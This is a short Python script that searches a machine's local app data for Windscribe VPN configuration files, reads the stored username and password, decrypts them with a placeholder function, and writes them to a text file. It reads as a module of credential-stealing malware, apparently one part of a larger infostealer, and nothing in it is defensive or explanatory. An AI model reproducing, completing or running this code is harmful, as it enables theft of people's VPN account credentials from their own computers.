import os
import xml.etree.ElementTree as ET
from pathlib import Path

windscribe_dir = Path(os.path.join(Paths.lappdata, "Windscribe"))

if not windscribe_dir.exists():
    exit()

try:
    accounts = []

    for account_file in windscribe_dir.rglob("OpenVPN_Configurations.xml"):
        doc = ET.parse(account_file)
        root = doc.getroot()

        encoded_username = root.find(".//Configuration/UserInformation/Username")
        encoded_password = root.find(".//Configuration/UserInformation/Password")

        if encoded_username is not None and encoded_password is not None:
            encoded_username = encoded_username.text
            encoded_password = encoded_password.text

            username = Decrypt(encoded_username)  # Replace Decrypt with your decryption logic
            password = Decrypt(encoded_password)  # Replace Decrypt with your decryption logic

            accounts.append(f"Username: {username}\nPassword: {password}\n")

    if accounts:
        output_path = os.path.join(os.getcwd(), "windscribe.txt")
        with open(output_path, "w") as output_file:
            output_file.write("".join(accounts))
except Exception as e:
    # Handle exceptions here
    print("An error occurred:", str(e))
